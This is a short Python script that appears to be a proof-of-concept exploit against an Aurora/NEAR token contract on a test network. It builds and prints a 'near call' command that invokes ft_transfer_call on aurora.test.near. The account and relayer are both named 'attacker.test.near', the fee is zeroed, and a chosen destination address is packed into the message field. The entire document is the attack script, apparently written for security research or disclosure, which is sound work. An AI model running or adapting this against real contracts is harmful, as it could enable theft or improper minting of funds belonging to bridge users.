#!/usr/bin/python3
import sys, base64, struct, json
address, amount = sys.argv[1:3]
account = 'attacker.test.near'
receiver = 'aurora.test.near'
relayer = 'attacker.test.near'
fee = '0' * 64
msg = '%s:%s%s' % (relayer, fee, address)
args = base64.b64encode(json.dumps({
    'receiver_id': receiver,
    'amount': amount,
    'memo': '',
    'msg': msg
}).encode('utf-8'))
cmd = "near call aurora.test.near ft_transfer_call --base64 --args '%s' --accountId %s --gas 300000000000000 --depositYocto 1" % (args.decode('utf-8'), account)
print(cmd)

